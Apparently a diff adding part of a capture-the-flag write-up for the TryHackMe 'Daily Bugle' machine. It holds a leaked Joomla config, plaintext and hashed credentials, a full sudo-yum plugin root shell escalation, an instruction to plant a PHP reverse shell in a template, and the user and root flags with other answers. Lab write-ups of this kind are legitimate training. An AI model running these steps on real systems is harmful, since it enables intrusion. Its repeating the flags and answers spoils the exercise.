@@ -477,3 +477,243 @@ class JConfig {
         public $dbprefix = 'fb9j5_';
         public $live_site = '';
         public $secret = 'UAMBRWzHO3oFPmVC';
+        public $gzip = '0';
+        public $error_reporting = 'default';
+        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+        public $ftp_host = '127.0.0.1';
+        public $ftp_port = '21';
+        public $ftp_user = '';
+        public $ftp_pass = '';
+        public $ftp_root = '';
+        public $ftp_enable = '0';
+        public $offset = 'UTC';
+        public $mailonline = '1';
+        public $mailer = 'mail';
+        public $mailfrom = 'jonah@tryhackme.com';
+        public $fromname = 'The Daily Bugle';
+        public $sendmail = '/usr/sbin/sendmail';
+        public $smtpauth = '0';
+        public $smtpuser = '';
+        public $smtppass = '';
+        public $smtphost = 'localhost';
+        public $smtpsecure = 'none';
+        public $smtpport = '25';
+        public $caching = '0';
+        public $cache_handler = 'file';
+        public $cachetime = '15';
+        public $cache_platformprefix = '0';
+        public $MetaDesc = 'New York City tabloid newspaper';
+        public $MetaKeys = '';
+        public $MetaTitle = '1';
+        public $MetaAuthor = '1';
+        public $MetaVersion = '0';
+        public $robots = '';
+        public $sef = '1';
+        public $sef_rewrite = '0';
+        public $sef_suffix = '0';
+        public $unicodeslugs = '0';
+        public $feed_limit = '10';
+        public $feed_email = 'none';
+        public $log_path = '/var/www/html/administrator/logs';
+        public $tmp_path = '/var/www/html/tmp';
+        public $lifetime = '15';
+        public $session_handler = 'database';
+        public $shared_session = '0';
+
+bash-4.2$ cd /home
+cd /home
+bash-4.2$ ls
+ls
+jjameson
+bash-4.2$ su jjameson
+su jjameson
+Password: nv5uz9r3ZEDzVjNu
+
+[jjameson@dailybugle home]$ whoami
+whoami
+jjameson
+[jjameson@dailybugle home]$ sudo -l
+sudo -l
+Matching Defaults entries for jjameson on dailybugle:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User jjameson may run the following commands on dailybugle:
+    (ALL) NOPASSWD: /usr/bin/yum
+[jjameson@dailybugle home]$ ls
+ls
+jjameson
+[jjameson@dailybugle home]$ cd jjameson
+cd jjameson
+[jjameson@dailybugle ~]$ ls
+ls
+user.txt
+[jjameson@dailybugle ~]$ cat user.txt
+cat user.txt
+27a260fe3cba712cfdedb1c86d80442e
+
+yum? Let’s check the OS: 
+
+[jjameson@dailybugle ~]$ cat /etc/redhat-release
+cat /etc/redhat-release
+CentOS Linux release 7.7.1908 (Core)
+
+Interestingly, the server is running on CentOS. Having a look a GTFOBins confirms several privesc with yum. Let’s try. 
+
+https://gtfobins.github.io/gtfobins/yum/
+
+[jjameson@dailybugle ~]$ TF=$(mktemp -d)
+TF=$(mktemp -d)
+[jjameson@dailybugle ~]$ cat >$TF/x<<EOF
+cat >$TF/x<<EOF
+> [main]
+[main]
+> plugins=1
+plugins=1
+> pluginpath=$TF
+pluginpath=$TF
+> pluginconfpath=$TF
+pluginconfpath=$TF
+> EOF
+EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.conf<<EOF
+cat >$TF/y.conf<<EOF
+> [main]
+[main]
+> enabled=1
+enabled=1
+> EOF
+EOF
+[jjameson@dailybugle ~]$ cat >$TF/y.py<<EOF
+cat >$TF/y.py<<EOF
+> import os
+import os
+> import yum
+import yum
+> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
+> requires_api_version='2.1'
+requires_api_version='2.1'
+> def init_hook(conduit):
+def init_hook(conduit):
+>  os.execl('/bin/sh','/bin/sh')
+ os.execl('/bin/sh','/bin/sh')
+> EOF
+EOF
+[jjameson@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
+sudo yum -c $TF/x --enableplugin=y
+Loaded plugins: y
+No plugin match for: y
+sh-4.2# whoami
+whoami
+root
+sh-4.2# cd /root
+cd /root
+sh-4.2# ls
+ls
+anaconda-ks.cfg  root.txt
+sh-4.2# cat root.txt
+cat root.txt
+eec3d53292b1821868266858d7fa6f79
+
+sh-4.2# cat anaconda-ks.cfg
+cat anaconda-ks.cfg
+#version=DEVEL
+```
+```text
+# System authorization information
+auth --enableshadow --passalgo=sha512
+```
+```text
+# Use network installation
+url --url="http://mirror.centos.org/centos/7/os/x86_64"
+```
+```text
+# Use graphical install
+graphical
+```
+```text
+# Run the Setup Agent on first boot
+firstboot --enable
+ignoredisk --only-use=sda
+```
+```text
+# Keyboard layouts
+keyboard --vckeymap=us --xlayouts='us'
+```
+```text
+# System language
+lang en_US.UTF-8
+```
+```text
+# Network information
+network  --bootproto=dhcp --device=enp0s3 --ipv6=auto --no-activate
+network  --hostname=localhost.localdomain
+```
+```text
+# Root password
+rootpw --iscrypted $6$UtzPhAF.UOU98Tbq$j5QChh/W3Al7HsBvtHiCgFtGCdCmTNX0Y0TcEbTgEj1mSd4AcDCGATUlicAQ2954oZpAFdZaKQfXdBgqkaMWJ1
+```
+```text
+# System services
+services --enabled="chronyd"
+```
+```text
+# System timezone
+timezone America/New_York --isUtc
+user --groups=wheel --name=jjameson --password=$6$fweSbUgxf43j7ldi$ds1nGOKPwQ2UblQibJlqp/ICBwqU09KSPBbe0bNV2sR0h8qodpH3EUZnxbycIA9/DMs8IqxFRT1SH90dPD39E0 --iscrypted --gecos="Jonah Jameson"
+```
+```text
+# System bootloader configuration
+bootloader --append=" crashkernel=auto" --location=mbr --boot-drive=sda
+autopart --type=lvm
+```
+```text
+# Partition clearing information
+clearpart --none --initlabel
+
+%packages
+@^minimal
+@core
+chrony
+kexec-tools
+
+%end
+
+%addon com_redhat_kdump --enable --reserve-mb='auto'
+
+%end
+
+%anaconda
+pwpolicy root --minlen=6 --minquality=1 --notstrict --nochanges --notempty
+pwpolicy user --minlen=6 --minquality=1 --notstrict --nochanges --emptyok
+pwpolicy luks --minlen=6 --minquality=1 --notstrict --nochanges --notempty
+%end
+```
+What is the Joomla version?
+I wonder if this version of Joomla is vulnerable...
+*3.7.0*
+*Instead of using SQLMap, why not use a python script!*
+What is Jonah's cracked password?
+SQLi & JohnTheRipper
+*spiderman123*
+![](https://www.aldeid.com/w/images/b/bf/CTF-TryHackMe-Daily-Bugle-joomla-templates-beez3.png)
+Now click on index.php and replace the content with the code from the PHP reverse shell you have downloaded (remember to put your IP address and port). Then click on Save.
+![](https://www.aldeid.com/w/images/2/26/CTF-TryHackMe-Daily-Bugle-joomla-hook-template-shell.png)
+What is the user flag?
+*27a260fe3cba712cfdedb1c86d80442e*
+What is the root flag?
+https://gtfobins.github.io/
+*eec3d53292b1821868266858d7fa6f79*
+### Credits
+![](https://i.imgur.com/BAy9QwL.png)
+Found another way to compromise the machine or want to assist others in rooting it? Keep an eye on the forum post located [here](https://tryhackme.com/forum/thread/5e1ef29a2eda9b0f20b151fd).
+
+## Notes / Lessons Learned
+[[Skynet]]
+
